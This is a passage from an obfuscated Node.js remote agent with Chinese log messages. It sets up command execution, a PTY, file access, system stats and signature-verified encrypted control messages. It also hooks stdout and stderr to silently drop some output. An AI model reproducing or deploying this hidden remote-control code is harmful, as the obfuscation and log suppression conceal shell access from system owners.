#!/usr/bin/env node
const a0aY = a0b;
(function (a, b) {
    const aX = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(aX(0x181)) / 0x1 * (parseInt(aX(0x149)) / 0x2) + parseInt(aX(0x3e0)) / 0x3 * (-parseInt(aX(0x223)) / 0x4) + parseInt(aX(0x29d)) / 0x5 + -parseInt(aX(0x27e)) / 0x6 * (parseInt(aX(0x3c4)) / 0x7) + -parseInt(aX(0x1de)) / 0x8 + parseInt(aX(0x545)) / 0x9 * (parseInt(aX(0x198)) / 0xa) + parseInt(aX(0x911)) / 0xb;
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0x60ac9));
const a0c = [
    a0aY(0x723),
    a0aY(0x596),
    a0aY(0x583)
];
function a0d(a) {
    const b = {
        'hBmju': function (c, d) {
            return c === d;
        },
        'yCboO': 'function'
    };
    return function (c, d, f) {
        const aZ = a0b, g = c['toString']();
        if (a0c[aZ(0x190)](h => g['includes'](h))) {
            if (b[aZ(0x5f5)](typeof f, b[aZ(0x7c8)]))
                f();
            return !![];
        }
        return a['apply'](this, arguments);
    };
}
process[a0aY(0x8da)]['write'] = a0d(process[a0aY(0x8da)]['write']), process[a0aY(0x211)][a0aY(0x2c2)] = a0d(process[a0aY(0x211)]['write']);
const a0f = require('express'), a0g = require(a0aY(0x502)), a0h = require('https'), a0i = require('net'), a0j = require('tls'), a0k = require('crypto'), a0l = require('fs'), a0m = require('fs')[a0aY(0x316)], a0n = require(a0aY(0x123)), a0o = require(a0aY(0x312)), a0p = require('os'), a0q = require(a0aY(0x88d)), {
        exec: a0r,
        spawn: a0s
    } = require(a0aY(0x14a)), a0t = require(a0aY(0x920)), a0u = require(a0aY(0x242)), {encrypt: a0v} = require(a0aY(0x841)), a0w = require(a0aY(0x914)), a0x = require(a0aY(0x8f1)), a0y = require('noise-c.wasm');
function a0z() {
    const b0 = a0aY, a = {
            'lSAXo': b0(0x234),
            'ufXfy': b0(0x3ef),
            'zDuop': function (b, c) {
                return b <= c;
            },
            'efoxj': function (b, c) {
                return b + c;
            },
            'dEjaN': function (b, c) {
                return b >= c;
            },
            'QPUdy': function (b, c) {
                return b in c;
            }
        };
    try {
        const b = a0o[b0(0x52c)](__dirname, a[b0(0x5d8)]);
        if (!a0l[b0(0x383)](b))
            return;
        for (let c of a0l[b0(0x3ce)](b, a[b0(0x82a)])[b0(0x140)](/\r?\n/)) {
            let d = c['trim']();
            if (!d || d['startsWith']('#'))
                continue;
            if (d[b0(0x627)](b0(0x50c)))
                d = d[b0(0x489)](0x7)['trimStart']();
            const f = d['indexOf']('=');
            if (a[b0(0x6ef)](f, 0x0))
                continue;
            const g = d[b0(0x489)](0x0, f)[b0(0x63e)]();
            let h = d[b0(0x489)](a[b0(0x129)](f, 0x1))['trim']();
            a[b0(0x466)](h[b0(0x7a3)], 0x2) && (h[b0(0x627)]('\x22') && h[b0(0x389)]('\x22') || h[b0(0x627)]('\x27') && h[b0(0x389)]('\x27')) && (h = h['slice'](0x1, -0x1));
            if (g && !a['QPUdy'](g, process.env))
                process.env[g] = h;
        }
    } catch (i) {
    }
}
a0z();
let a0A, a0B, a0C;
try {
    typeof Bun !== a0aY(0x427) ? a0C = require('bun-pty') : a0C = require(a0aY(0x542));
} catch (a0aW) {
    console[a0aY(0x8e9)](a0aY(0x74e)), console[a0aY(0x8e9)](a0aY(0x4d4) + a0aW[a0aY(0x49d)]), console[a0aY(0x8e9)](a0aY(0x225)), process['exit'](0x1);
}
const a0D = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const b1 = a0aY, a = {
                'xQqXW': function (b, c) {
                    return b !== c;
                },
                'vnDHY': 'undefined'
            };
        return a[b1(0x614)](typeof a0P, a['vnDHY']) && a[b1(0x614)](a0P['LOG_LEVEL'], undefined) ? a0P[b1(0x8a7)] : 0x2;
    },
    'debug': a => {
        const b2 = a0aY, b = {
                'AxyIW': function (c, d) {
                    return c <= d;
                }
            };
        b[b2(0x4bc)](a0D['currentLevel'], a0D[b2(0x526)][b2(0x17a)]) && console['log']('\x1b[90m[DEBUG]\x1b[0m\x20' + a);
    },
    'info': a => {
        const b3 = a0aY, b = {
                'DfJqR': function (c, d) {
                    return c <= d;
                }
            };
        b[b3(0x6ff)](a0D['currentLevel'], a0D[b3(0x526)][b3(0x3be)]) && console[b3(0x10d)](b3(0x2cf) + a);
    },
    'warn': a => {
        const b4 = a0aY;
        a0D[b4(0x6dc)] <= a0D[b4(0x526)][b4(0x35b)] && console['log'](b4(0x8f8) + a);
    },
    'error': a => {
        const b5 = a0aY, b = {
                'eaPcS': function (c, d) {
                    return c <= d;
                }
            };
        b['eaPcS'](a0D[b5(0x6dc)], a0D['LEVELS'][b5(0x929)]) && console[b5(0x10d)]('\x1b[31m[ERROR]\x1b[0m\x20' + a);
    }
};
function a0E() {
    const b6 = a0aY, a = [
            process.env.USERPROFILE,
            process.env.HOME,
            a0p[b6(0x16c)](),
            process['cwd']()
        ];
    for (const b of a) {
        if (b && a0l[b6(0x383)](b) && a0l[b6(0x479)](b)[b6(0x4e4)]())
            return b;
    }
    return process['cwd']();
}
function a0F() {
    const b7 = a0aY;
    let a = null;
    try {
        a = a0p[b7(0x16c)]();
    } catch (c) {
    }
    const b = [
        process.env.FILE_ROOT,
        a
    ];
    for (const d of b) {
        if (d && a0l[b7(0x383)](d) && a0l[b7(0x479)](d)[b7(0x4e4)]())
            return d;
        if (d)
            console[b7(0x10d)]('\x1b[33m[WARN]\x1b[0m\x20FILE_ROOT\x20候选目录不存在,\x20已跳过:\x20' + d);
    }
    return console[b7(0x10d)](b7(0x4cf) + process['cwd']()), process[b7(0x133)]();
}
class a0G {
    constructor(a = 'ok') {
        const b8 = a0aY;
        this[b8(0x59c)] = a;
    }
}
class a0H extends a0G {
    constructor(a = 'ok', b = 0x0) {
        super(a), this['count'] = b;
    }
}
class a0I extends a0G {
    constructor() {
        const b9 = a0aY;
        super(), this[b9(0x88e)] = '', this['cpu_cores'] = 0x0, this['cpu_name'] = '', this[b9(0x7ae)] = 0x0, this[b9(0x581)] = '', this[b9(0x74f)] = null, this['ipv6'] = null, this[b9(0x2f0)] = 0x0, this['os'] = '', this['kernel_version'] = '', this['swap_total'] = 0x0, this[b9(0x497)] = a0P[b9(0x8fb)], this[b9(0x698)] = '', this[b9(0x651)] = [], this[b9(0x279)] = '', this[b9(0x912)] = null;
    }
}
class a0J extends a0G {
    constructor() {
        const ba = a0aY, a = ba(0x4aa)[ba(0x140)]('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[ba(0x722)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '1':
                super();
                continue;
            case '2':
                this['process'] = 0x0;
                continue;
            case '3':
                this['load'] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '4':
                this[ba(0x803)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '5':
                this['cpu'] = { 'usage': 0x0 };
                continue;
            case '6':
                this['network'] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '7':
                this[ba(0x5e4)] = 0x0;
                continue;
            case '8':
                this['ram'] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '9':
                this[ba(0x649)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '10':
                this[ba(0x49d)] = '';
                continue;
            }
            break;
        }
    }
}
class a0K extends a0G {
    constructor() {
        const bb = a0aY;
        super(), this[bb(0x130)] = '', this[bb(0x361)] = 0x0, this[bb(0x1eb)] = ![], this[bb(0x3b3)] = '';
    }
}
class a0L {
    constructor() {
        const bc = a0aY, a = bc(0x1ee)['split']('|');
        let b = 0x0;
        while (!![]) {
            switch (a[b++]) {
            case '0':
                this[bc(0x312)] = '';
                continue;
            case '1':
                this[bc(0x165)] = '';
                continue;
            case '2':
                this[bc(0x839)] = '';
                continue;
            case '3':
                this[bc(0x8fe)] = 0x0;
                continue;
            case '4':
                this[bc(0x2d4)] = '';
                continue;
            case '5':
                this[bc(0x1cf)] = '';
                continue;
            case '6':
                this[bc(0x1f4)] = '';
                continue;
            case '7':
                this[bc(0x3b1)] = '';
                continue;
            }
            break;
        }
    }
}
class a0M {
    constructor() {
        const bd = a0aY, a = { 'TePWB': bd(0x68d) }, b = a[bd(0x5a3)][bd(0x140)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[bd(0x312)] = '';
                continue;
            case '1':
                this['name'] = '';
                continue;
            case '2':
                this[bd(0x832)] = ![];
                continue;
            case '3':
                this[bd(0x867)] = ![];
                continue;
            case '4':
                this[bd(0x1cf)] = '';
                continue;
            case '5':
                this['type'] = '';
                continue;
            case '6':
                this[bd(0x2d2)] = ![];
                continue;
            case '7':
                this[bd(0x2d4)] = '';
                continue;
            }
            break;
        }
    }
}
class a0N extends a0G {
    constructor() {
        super(), this['files'] = [];
    }
}
class a0O {
    static ['_generateRawKeypair']() {
        const be = a0aY, a = {
                'qawLu': be(0x764),
                'AZBvy': be(0x820),
                'lHqdr': 'base64url',
                'tuuAO': function (i, j) {
                    return i !== j;
                },
                'OjpIi': function (i, j) {
                    return i !== j;
                },
                'pRtKT': be(0x880)
            }, {
                privateKey: b,
                publicKey: c
            } = a0k[be(0x4b3)](a[be(0x743)]), d = b[be(0x291)]({ 'format': a[be(0x8b0)] }), f = c[be(0x291)]({ 'format': a['AZBvy'] }), g = Buffer[be(0x68c)](d['d'], a[be(0x1f3)]), h = Buffer[be(0x68c)](f['x'], a[be(0x1f3)]);
        return (a[be(0x8af)](g[be(0x7a3)], 0x20) || a[be(0x155)](h[be(0x7a3)], 0x20)) && a0D[be(0x8e9)](be(0x4de)), {
            'private_b64': g['toString'](a[be(0x6ed)]),
            'public_b64': h[be(0x491)](a[be(0x6ed)])
        };
    }
    static [a0aY(0x638)](a) {
        const bf = a0aY, b = this[bf(0x848)]();
        return {
            'role': a,
            'private_b64': b[bf(0xff)],
            'public_b64': b[bf(0x6bb)]
        };
    }
    static [a0aY(0x5e7)](a = a0aY(0x4c6), b = a0aY(0x592)) {
        const bg = a0aY, c = {
                'control': this['generateSingle'](a),
                'agent': this[bg(0x638)](b)
            };
        return c;
    }
}
class a0P {
    static [a0aY(0x351)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static ['EXEC_SHELL_MODE'] = (process.env.EXEC_SHELL || a0aY(0x8b6))[a0aY(0x1a2)]() === a0aY(0x8b6);
    static [a0aY(0x17a)] = (process.env.DEBUG || a0aY(0x70a))['toLowerCase']() === a0aY(0x8b6);
    static ['TIMESTAMP_WINDOW'] = parseInt(process.env.TIMESTAMP_WINDOW || a0aY(0x631));
    static [a0aY(0x8a7)] = parseInt(process.env.LOG_LEVEL || (this[a0aY(0x17a)] ? '0' : '3'), 0xa);
    static [a0aY(0x7bc)] = a0P[a0aY(0x72e)](a0aY(0x85b), a0aY(0x6b1)) || 'ECDSA公钥内容';
    static ['ECIES_PUBLIC_KEY_PEM'] = a0P[a0aY(0x72e)](a0aY(0x83d), 'keys/agent_ecies_pub.b64') || 'ECIES公钥内容';
    static [a0aY(0x647)] = parseInt(process.env.TEMPKEY_TTL || '24', 0xa);
    static [a0aY(0x70e)] = parseInt(process.env.TEMPKEY_MAX_TTL || a0aY(0x5ae), 0xa);
    static [a0aY(0x724)] = a0F();
    static ['MAX_UPLOAD_SIZE'] = parseInt(process.env.MAX_UPLOAD_SIZE || a0aY(0x20e));
    static [a0aY(0x86f)] = (process.env.FOLLOW_SYMLINKS || a0aY(0x70a))['toLowerCase']() === 'true';
    static [a0aY(0x47f)] = (process.env.FILE_AUDIT_LOG || a0aY(0x8b6))[a0aY(0x1a2)]() === 'true';
    static [a0aY(0x34b)] = !![];
    static [a0aY(0x278)] = [];
    static [a0aY(0x83c)] = {};
    static [a0aY(0x164)] = ![];
    static [a0aY(0x763)] = parseInt(process.env.TASK_TIMEOUT || '300');
    static [a0aY(0x637)] = parseInt(process.env.CRON_INTERVAL || '30');
    static ['onetimetasks_log'] = [];
    static [a0aY(0x869)] = [];
    static ['MAX_TASK_LOG_SIZE'] = parseInt(process.env.MAX_TASK_LOG || a0aY(0x388));
    static [a0aY(0x500)] = process.env.HOST || a0aY(0x815);
    static [a0aY(0x338)] = parseInt(process.env.KPORT || process.env.PORT || process.env.SERVER_PORT || a0aY(0x3df));
    static [a0aY(0x682)] = (process.env.KMODE || '0')[a0aY(0x63e)]() || '0';
    static [a0aY(0x600)] = (process.env.KNAME || '')['trim']();
    static [a0aY(0x8ae)] = (process.env.KNAME_KEY || '')[a0aY(0x63e)]();
    static [a0aY(0x5bf)] = process.env.KPATH || '';
    static [a0aY(0x8fb)] = process.env.AGENT_VERSION || a0aY(0x31a);
    static [a0aY(0x78f)] = a0k[a0aY(0x3f6)](0x20)['toString']('base64');
    static ['NOISE_KEYS_INTERNAL'] = a0O[a0aY(0x5e7)]();
    static ['wsDowngradeToken']() {
        const bh = a0aY, a = {
                'DDGNy': 'sha256',
                'vyrba': 'base64',
                'JXCyv': bh(0x6aa)
            };
        return a0k[bh(0x452)](a[bh(0x4a0)], Buffer['from'](this[bh(0x78f)], a['vyrba']))[bh(0x3cf)](a[bh(0x879)])['digest'](a['vyrba']);
    }
    static ['rotateOperationalSecrets']() {
        const bi = a0aY, a = {
                'dgKGm': bi(0x880),
                'WZcaM': bi(0xfa)
            }, b = a0O[bi(0x5e7)]();
        this[bi(0x458)][bi(0x6a0)] = b[bi(0x6a0)], this[bi(0x601)][bi(0x3e2)][bi(0x59e)] = b[bi(0x6a0)]['private_b64'], this[bi(0x78f)] = a0k[bi(0x3f6)](0x20)[bi(0x491)](a[bi(0x6c4)]), this[bi(0x7f2)] = null, this[bi(0x725)] = 0x0, a0D['warn'](a[bi(0x6e4)]);
    }
    static ['NOISE_KEY'] = {
        'controller': { 'private': this['NOISE_KEYS_INTERNAL']['control'][a0aY(0xff)] },
        'agent': { 'public': this[a0aY(0x458)][a0aY(0x784)][a0aY(0x6bb)] }
    };
    static ['BASEINFO_CACHE_TTL'] = 0xe10;
    static [a0aY(0x7ad)] = 0x1e;
    static ['BASEINFO_FAIL_BACKOFF'] = 0x3c;
    static [a0aY(0x188)] = 0x1e;
    static ['_baseinfo_p_cache'] = null;
    static [a0aY(0x396)] = null;
    static ['_baseinfo_local_cache'] = null;
    static ['_baseinfo_local_time'] = 0x0;
    static [a0aY(0x2c5)] = 0x0;
    static [a0aY(0x455)] = null;
    static [a0aY(0x7f7)] = null;
    static [a0aY(0x4b1)] = 0x0;
    static [a0aY(0x87d)] = 0x0;
    static [a0aY(0x8ce)] = null;
    static [a0aY(0x7f2)] = null;
    static [a0aY(0x725)] = 0x0;
    static ['_status_fetch_promise'] = null;
    static [a0aY(0x116)]() {
        const bj = a0aY, a = {
                'cPDgj': function (b, c) {
                    return b(c);
                }
            };
        return a['cPDgj'](Number, process[bj(0x33f)][bj(0x295)]() / 0xf4240n);
    }
    static [a0aY(0x3e6)](a) {
        return a ? { ...a } : null;
    }
    static async [a0aY(0x1be)]() {
        const bk = a0aY;
        if (this['_baseinfo_p_cache'])
            return this['_cloneBaseInfoPart'](this['_baseinfo_p_cache']);
        return !this[bk(0x396)] && (this[bk(0x396)] = new a0U()[bk(0x48d)]()[bk(0x7ea)](a => {
            const bl = bk;
            return a0D[bl(0x925)](bl(0x8f5) + a[bl(0x49d)], 0x1), a0U[bl(0x7e1)]();
        })[bk(0x60e)](a => {
            const bm = bk;
            return this[bm(0x380)] = a, a;
        })[bk(0x801)](() => {
            const bn = bk;
            this[bn(0x396)] = null;
        })), this['_cloneBaseInfoPart'](await this[bk(0x396)]);
    }
    static async [a0aY(0x924)](a) {
        const bo = a0aY, b = {
                'eQQCE': function (d, f) {
                    return d < f;
                },
                'lLsDO': function (d, f) {
                    return d - f;
                },
                'hAEyg': function (d, f) {
                    return d * f;
                },
                'brkrh': function (d, f) {
                    return d < f;
                },
                'nAERT': function (d, f) {
                    return d - f;
                }
            }, c = this[bo(0x116)]();
        if (this[bo(0x39a)] && b[bo(0x1b0)](b[bo(0x436)](c, this['_baseinfo_local_time']), b['hAEyg'](this['BASEINFO_LOCAL_TTL'], 0x3e8)))
            return this[bo(0x3e6)](this[bo(0x39a)]);
        if (this[bo(0x2c5)] && b[bo(0x2ca)](b['nAERT'](c, this[bo(0x2c5)]), b[bo(0x3fa)](this['BASEINFO_FAIL_BACKOFF'], 0x3e8)))
            return this[bo(0x3e6)](this[bo(0x39a)] || a0U[bo(0x203)]());
        return !this[bo(0x455)] && (this[bo(0x455)] = new a0U()[bo(0x4c0)](a)[bo(0x60e)](d => {
            const bp = bo;
            return this['_baseinfo_local_cache'] = d, this[bp(0x585)] = this[bp(0x116)](), this[bp(0x2c5)] = 0x0, d;
        })[bo(0x7ea)](d => {
            const bq = bo;
            return a0D['debug'](bq(0x469) + d['message'], 0x1), this['_baseinfo_local_fail_time'] = this['_baseInfoNowMs'](), this[bq(0x39a)] || a0U[bq(0x203)]();
        })[bo(0x801)](() => {
            this['_baseinfo_local_promise'] = null;
        })), this[bo(0x3e6)](await this[bo(0x455)]);
    }
    static async [a0aY(0x4b2)]() {
        const br = a0aY, a = {
                'ZaXTg': function (c, d) {
                    return c - d;
                },
                'xnobn': function (c, d) {
                    return c * d;
                },
                'bGDgo': function (c, d) {
                    return c < d;
                },
                'SsLfH': function (c, d) {
                    return c * d;
                }
            }, b = this[br(0x116)]();
        if (this[br(0x7f7)] && a['ZaXTg'](b, this[br(0x4b1)]) < a[br(0x701)](this[br(0x3f2)], 0x3e8))
            return this[br(0x3e6)](this[br(0x7f7)]);
        if (this[br(0x87d)] && a[br(0x4ad)](b - this[br(0x87d)], a['SsLfH'](this['BASEINFO_FAIL_BACKOFF'], 0x3e8)))
            return this[br(0x3e6)](this[br(0x7f7)] || a0U[br(0x128)]());
        return !this[br(0x8ce)] && (this['_baseinfo_net_promise'] = new a0U()['collectNetInfo']()['then'](c => {
            const bs = br;
            return this[bs(0x7f7)] = c, this[bs(0x4b1)] = this[bs(0x116)](), this[bs(0x87d)] = 0x0, c;
        })['catch'](c => {
            const bt = br;
            return a0D[bt(0x925)](bt(0x473) + c['message'], 0x1), this[bt(0x87d)] = this[bt(0x116)](), this[bt(0x7f7)] || a0U['netFallback']();
        })[br(0x801)](() => {
            this['_baseinfo_net_promise'] = null;
        })), this['_cloneBaseInfoPart'](await this[br(0x8ce)]);
    }
    static [a0aY(0x72e)](a, b) {
        const bu = a0aY, c = { 'pIDsB': 'utf8' }, d = process.env[a];
        if (d)
            return d;
        const f = a0o[bu(0x52c)](__dirname, b);
        if (a0l[bu(0x383)](f))
            try {
                return a0l[bu(0x3ce)](f, c['pIDsB'])[bu(0x63e)]();
            } catch (g) {
            }
        return '';
    }
    static ['validate']() {
        const bv = a0aY, a = {
                'MEYSw': 'ECIES_PUBKEY:\x20未设置环境变量且文件\x20keys/agent_ecies_pub.b64\x20不存在',
                'cJvVj': function (b, c) {
                    return b > c;
                },
                'cBkVp': '\x0a💡\x20解决方法:',
                'RcmyJ': '\x20\x20\x201.\x20设置环境变量:\x20export\x20ECDSA_PUBKEY=\x27-----BEGIN\x20PUBLIC\x20KEY-----\x27...\x27'
            };
        if (!this[bv(0x17a)]) {
            const b = [];
            !this[bv(0x7bc)] && b['push'](bv(0x825)), !this['ECIES_PUBLIC_KEY_PEM'] && b[bv(0x75e)](a['MEYSw']), a[bv(0x478)](b['length'], 0x0) && (a0D[bv(0x8e9)](bv(0x3d5)), b[bv(0x2ee)](c => a0D[bv(0x8e9)](bv(0x1ad) + c)), a0D[bv(0x925)](a[bv(0x7f0)]), a0D[bv(0x925)](a['RcmyJ']), a0D[bv(0x925)](bv(0x8cc)), process['exit'](0x1));
        }
    }
    static [a0aY(0x3dc)](a = {}) {
        const bw = a0aY, b = {
                'MmOUd': function (c, d) {
                    return c !== d;
                },
                'pWlGZ': function (c, d, f) {
                    return c(d, f);
                },
                'XZepq': function (c, d) {
                    return c(d);
                },
                'WJhht': function (c, d) {
                    return c !== d;
                },
                'tpCXS': function (c, d) {
                    return c(d);
                },
                'rgQou': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b['MmOUd'](a[bw(0x338)], undefined) && b['MmOUd'](a['PORT'], null) && (this['PORT'] = b[bw(0x533)](parseInt, b[bw(0x62c)](String, a[bw(0x338)]), 0xa));
        a[bw(0x7bc)] && (this[bw(0x7bc)] = a[bw(0x7bc)][bw(0x63e)]());
        a[bw(0x3b9)] && (this[bw(0x3b9)] = a['ECIES_PUBLIC_KEY_PEM'][bw(0x63e)]());
        if (a[bw(0x682)] !== undefined && b[bw(0x634)](a[bw(0x682)], null)) {
            const c = b[bw(0x62c)](String, a[bw(0x682)])['trim']();
            /^[012]$/[bw(0x731)](c) ? this['KMODE'] = c : (this[bw(0x682)] = '0', a0D[bw(0x444)](bw(0x44e) + b[bw(0x62c)](String, a[bw(0x682)]) + bw(0x859)));
        }
        a[bw(0x600)] && String(a['KNAME'])['trim']() && (this[bw(0x600)] = b[bw(0x231)](String, a[bw(0x600)])[bw(0x63e)]()), a[bw(0x8ae)] && b[bw(0x231)](String, a[bw(0x8ae)])[bw(0x63e)]() && (this[bw(0x8ae)] = String(a[bw(0x8ae)])['trim']()), a['KPATH'] && b[bw(0x32c)](String, a[bw(0x5bf)])['trim']() && (this['KPATH'] = b[bw(0x32c)](String, a[bw(0x5bf)])['trim']());
    }
}
class a0Q {
    constructor() {
        const bx = a0aY;
        this[bx(0x14b)] = null, this[bx(0x62f)] = null;
    }
    [a0aY(0x2f7)](a) {
        const by = a0aY;
        this['_expireCurrent']();
        if (this['_key'])
            return this['_key'];
        return this[by(0x14b)] = this['_generate'](a), a0D['info'](by(0x21d) + this[by(0x14b)]['key_id'] + by(0x85a) + a + by(0x7f1)), this[by(0x14b)];
    }
    [a0aY(0x488)]() {
        const bz = a0aY;
        this[bz(0x2cc)]();
        if (this[bz(0x14b)])
            return this['_key'][bz(0x827)];
        return null;
    }
    [a0aY(0x27f)]() {
        const bA = a0aY;
        this[bA(0x2cc)]();
        if (this[bA(0x14b)])
            return this[bA(0x14b)][bA(0x5f0)];
        return null;
    }
    [a0aY(0x2cc)]() {
        const bB = a0aY, a = { 'Bnnvl': bB(0x45a) };
        if (this['_key'] && this['_isExpired'](this[bB(0x14b)])) {
            const b = this['_key'][bB(0x5ad)];
            this[bB(0x14b)] = null, a0D[bB(0x444)]('🔄\x20[TempKey]\x20临时密钥已过期:\x20key_id=' + b);
            if (typeof this['onExpired'] === a[bB(0x572)])
                try {
                    this[bB(0x62f)]();
                } catch (c) {
                    a0D[bB(0x8e9)](bB(0x89b) + c[bB(0x49d)]);
                }
        }
    }
    [a0aY(0x54c)](a) {
        const bC = a0aY, b = {
                'SveIB': function (c, d) {
                    return c >= d;
                }
            };
        return b['SveIB'](Math[bC(0x29f)](Date[bC(0x855)]() / 0x3e8), a[bC(0x66b)]);
    }
    [a0aY(0x2c6)](a) {
        const bD = a0aY, b = {
                'wQGeq': 'prime256v1',
                'hHXHl': bD(0x599),
                'aFmTM': bD(0x919),
                'JLyte': bD(0x829),
                'iFIEf': bD(0x820),
                'UusOc': function (o, p) {
                    return o - p;
                },
                'ipyMa': function (o, p) {
                    return o / p;
                },
                'KMxfB': bD(0x546),
                'xioZP': function (o, p) {
                    return o + p;
                },
                'NInrU': bD(0x43d),
                'fGyST': 'base64'
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[bD(0x4b3)]('ec', { 'namedCurve': b['wQGeq'] }), f = c[bD(0x291)]({
                'type': b[bD(0x1d6)],
                'format': 'pem'
            }), g = d['export']({
                'type': b['aFmTM'],
                'format': b[bD(0x1cb)]
            }), h = a0k['randomBytes'](0x20), i = Buffer[bD(0x68c)](a0B[bD(0x432)](h, ![])), j = c[bD(0x291)]({ 'format': b['iFIEf'] }), k = d[bD(0x291)]({
                'type': bD(0x919),
                'format': bD(0x2c9)
            }), l = k['subarray'](b['UusOc'](k[bD(0x7a3)], 0x41)), m = Math[bD(0x29f)](b[bD(0x206)](Date[bD(0x855)](), 0x3e8)), n = a * 0xe10;
        return {
            'key_id': a0k[bD(0x3f6)](0x8)['toString'](b[bD(0x5e1)]),
            'created_at': m,
            'expires_at': b[bD(0x2d0)](m, n),
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bD(0x491)](b['KMxfB']),
            'ecies_public_key': i['toString'](b[bD(0x5e1)]),
            'ecdsa_private_hex': Buffer[bD(0x68c)](j['d'], b[bD(0x103)])[bD(0x491)](b['KMxfB']),
            'ecdsa_public_b64': Buffer[bD(0x68c)](a0A[bD(0x2e9)][bD(0x870)](l)[bD(0x5c6)](!![]))[bD(0x491)](bD(0x880)),
            'ecies_public_b64': Buffer[bD(0x68c)](a0B[bD(0x432)](h, !![]))[bD(0x491)](b['fGyST']),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bE = a0aY, c = {
                'TygTn': bE(0x639),
                'VCthu': 'base64',
                'HemiM': function (d, f) {
                    return d(f);
                },
                'XTPAg': function (d, f) {
                    return d(f);
                },
                'OlLgS': bE(0x3ba)
            };
        this[bE(0x889)] = null, this[bE(0x202)] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d['startsWith'](c[bE(0x672)]))
                    this[bE(0x889)] = a0k['createPublicKey'](d);
                else {
                    const f = Buffer['from'](d, c[bE(0x934)]), g = a0A[bE(0x2e9)][bE(0x870)](f), h = g[bE(0x5c6)](![]), i = m => m['toString'](bE(0x880))['replace'](/\+/g, '-')[bE(0x655)](/\//g, '_')[bE(0x655)](/=/g, ''), j = c[bE(0x377)](i, Buffer[bE(0x68c)](h[bE(0x489)](0x1, 0x21))), k = c[bE(0x5ab)](i, Buffer[bE(0x68c)](h['slice'](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[bE(0x16a)],
                            'x': j,
                            'y': k
                        };
                    this[bE(0x889)] = a0k[bE(0x363)]({
                        'key': l,
                        'format': 'jwk'
                    });
                }
            } catch (m) {
                a0D[bE(0x8e9)]('⚠️\x20ECDSA公钥加载失败:\x20' + m[bE(0x49d)]), this['ecdsaPubkey'] = null;
            }
        if (b)
            try {
                this[bE(0x202)] = a0w[bE(0x2a9)](b['trim']());
            } catch (n) {
                a0D[bE(0x444)]('⚠️\x20ECIES公钥解码失败:\x20' + n[bE(0x49d)]);
            }
    }
    ['verifySignature'](a, b, c, d, f, g, h = null) {
        const bF = a0aY, i = {
                'Orzqe': bF(0x523),
                'lHfJT': function (j, k) {
                    return j(k);
                },
                'HQKiQ': function (j, k) {
                    return j > k;
                },
                'DGCwr': function (j, k) {
                    return j - k;
                },
                'ILdQk': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'rbLHK': bF(0x7e3),
                'LQJUS': bF(0x1a8),
                'CbcVY': bF(0x6a9)
            };
        if (!this[bF(0x889)])
            throw new Error(i[bF(0x437)]);
        try {
            const j = i[bF(0x8c1)](parseInt, f), k = Math[bF(0x29f)](Date[bF(0x855)]() / 0x3e8);
            if (i[bF(0x297)](Math[bF(0x2e2)](k - j), a0P[bF(0x8dd)]))
                throw new Error(bF(0x64d) + Math[bF(0x2e2)](i['DGCwr'](k, j)) + 's\x20>\x20' + a0P[bF(0x8dd)] + 's');
            const l = i[bF(0x90a)](a0S, a, b, c, d, f);
            if (this['_verifyWith'](this[bF(0x889)], l, g))
                return i[bF(0x69b)];
            if (h && this[bF(0x249)](h, l, g))
                return i[bF(0x410)];
            throw new Error(i[bF(0x736)]);
        } catch (m) {
            throw new Error(bF(0x92a) + m[bF(0x49d)]);
        }
    }
    ['_verifyWith'](a, b, c) {
        const bG = a0aY, d = { 'teZau': bG(0x245) };
        if (!a)
            return ![];
        try {
            const f = a0w['toByteArray'](c), g = a0k['createVerify'](d['teZau']);
            return g[bG(0x3cf)](b), g[bG(0x514)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aY(0x13f)](a, b = null) {
        const bH = a0aY, c = {
                'mQnFt': bH(0x330),
                'qdtsH': bH(0x30c),
                'npXfz': function (d, f, g) {
                    return d(f, g);
                },
                'jqfzx': bH(0x880)
            };
        if (a0P[bH(0x17a)])
            return JSON[bH(0x548)](a);
        if (!this[bH(0x202)])
            throw new Error(c[bH(0x5e3)]);
        try {
            const d = JSON[bH(0x548)](a), f = Buffer[bH(0x68c)](d, c[bH(0x6b8)]), g = b || Buffer[bH(0x68c)](this[bH(0x202)]), h = c[bH(0x650)](a0v, g, f);
            return Buffer[bH(0x68c)](h)[bH(0x491)](c[bH(0x76e)]);
        } catch (i) {
            throw new Error(bH(0x2f8) + i[bH(0x49d)]);
        }
    }
    ['decryptData'](a, b) {
        const bI = a0aY, c = {
                'KRSuA': bI(0x72b),
                'bQNiG': 'base64',
                'PZHWs': bI(0x3ef),
                'LMCnD': bI(0x5a5)
            };
        if (!b || b[bI(0x7a3)] !== 0x20)
            throw new Error(c['KRSuA']);
        try {
            const d = Buffer['from'](a, c[bI(0x4ab)])[bI(0x491)](c[bI(0x529)]), f = JSON[bI(0x7f4)](d);
            if (!f[bI(0x6fc)] || !f[bI(0x7e8)] || !f[bI(0x172)])
                throw new Error(c['LMCnD']);
